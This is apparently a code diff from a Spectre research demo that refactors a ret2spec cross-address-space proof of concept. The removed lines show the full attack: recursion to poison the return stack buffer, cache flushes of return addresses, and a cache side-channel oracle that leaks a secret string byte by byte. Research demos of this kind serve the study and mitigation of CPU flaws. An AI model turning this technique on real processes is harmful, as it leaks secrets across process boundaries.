+++ demos/ret2spec_ca.cc
@@ -42,101 +42,18 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "local_content.h"
+#include "ret2spec_common.h"
 #include "utils.h"
 
-const char *private_data = "It's a s3kr3t!!!";
-
-// Recursion depth should be equal or greater than the RSB size, but not
-// excessively high because of the possibility of stack overflow.
-constexpr size_t kRecursionDepth = 64;
-constexpr size_t kCacheLineSize = 64;
-
-// Global variables used to avoid passing parameters through recursive function
-// calls. Since we flush whole stack frames from the cache, it is important not
-// to store on stack any data that might be affected by being flushed from
-// cache.
-size_t current_offset;
-const std::array<BigByte, 256> *oracle_ptr;
-
-// Return value of ReturnsFalse that never changes. Avoiding compiler
-// optimizations with it.
-bool false_value = false;
-// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
-// from the cache.
-std::vector<char *> stack_mark_pointers;
-
-// Always returns false. Executed only by the child.
-static bool ReturnsFalse(int counter) {
-  if (counter > 0) {
-    if (ReturnsFalse(counter - 1)) {
-      // Unreachable code. ReturnsFalse can never return true.
-      const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
-      ForceRead(isolated_oracle.data() +
-                static_cast<unsigned char>(private_data[current_offset]));
-      std::cout << "Dead code. Must not be printed." << std::endl;
-      exit(EXIT_FAILURE);
-    }
-  } else {
-    // Yield the CPU to increase the interference.
-    sched_yield();
-  }
-  return false_value;
-}
-
-// Always returns true. Executed only by the attacker.
-static bool ReturnsTrue(int counter) {
-  // Creates a stack mark and stores it to the global vector.
-  char stack_mark = 'a';
-  stack_mark_pointers.push_back(&stack_mark);
-
-  if (counter > 0) {
-    // Recursively invokes itself.
-    ReturnsTrue(counter - 1);
-  } else {
-    // Let the other process run to increase the interference.
-    sched_yield();
-  }
-
-  // Cleans-up its stack mark and flushes from the cache everything between its
-  // own stack mark and the next one. Somewhere there must be also the return
-  // address.
-  stack_mark_pointers.pop_back();
-    for (int i = 0; i < (stack_mark_pointers.back() - &stack_mark);
-       i += kCacheLineSize) {
-    CLFlush(&stack_mark + i);
-  }
-  CLFlush(stack_mark_pointers.back());
-  return true;
-}
-
-static char LeakByte() {
-  CacheSideChannel sidechannel;
-  oracle_ptr = &sidechannel.GetOracle();
-  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
-
-  for (int run = 0;; ++run) {
-    sidechannel.FlushOracle();
-
-    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
-    // from an empty vector and crash.
-    char stack_mark = 'a';
-    stack_mark_pointers.push_back(&stack_mark);
-    ReturnsTrue(kRecursionDepth);
-    stack_mark_pointers.pop_back();
-
-    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
-    if (result.first) {
-      return result.second;
-    }
-
-    if (run > 100000) {
-      std::cerr << "Does not converge " << result.second << std::endl;
-      exit(EXIT_FAILURE);
-    }
-  }
+// Yield the CPU.
+static void Unschedule() {
+  sched_yield();
 }
 
 int main() {
+  ConditionallyUnschedule = Unschedule;
+  UnscheduleOrStartReturnsFalse = Unschedule;
   // Parent PID for the death-checking of the child.
   pid_t ppid = getpid();
   // We need both processes to run on the same core. Pinning the parent before
@@ -166,7 +83,7 @@ int main() {
     std::cout.flush();
     for (size_t i = 0; i < strlen(private_data); ++i) {
       current_offset = i;
-      std::cout << LeakByte();
+      std::cout << Ret2specLeakByte();
       std::cout.flush();
     }
   }
